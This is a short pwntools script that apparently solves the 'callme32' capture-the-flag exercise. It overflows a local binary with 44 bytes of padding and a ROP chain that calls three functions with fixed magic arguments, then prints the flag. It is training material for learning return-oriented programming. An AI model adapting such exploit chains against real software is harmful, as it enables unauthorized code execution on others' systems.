from pwn import*
elf = context.binary = ELF('./callme32', checksec=False)
p = process()
padding = 44
rop = ROP(elf)
params = [0xdeadbeef,
          0xcafebabe,
          0xd00df00d]

rop.callme_one(*params)
rop.callme_two(*params)
rop.callme_three(*params)

# print(rop.dump())
# print(rop.gadgets)

# Rop chain
rop_chain = rop.chain()
info("rop chain: %r", rop_chain)

payload = flat({
    padding: rop_chain  # ROP
}
)

write("payload", payload)

# PWN
p.sendlineafter('>', payload)
p.recvuntil('Thank you!\n')

# Get our flag!
flag = p.recv()
success(flag)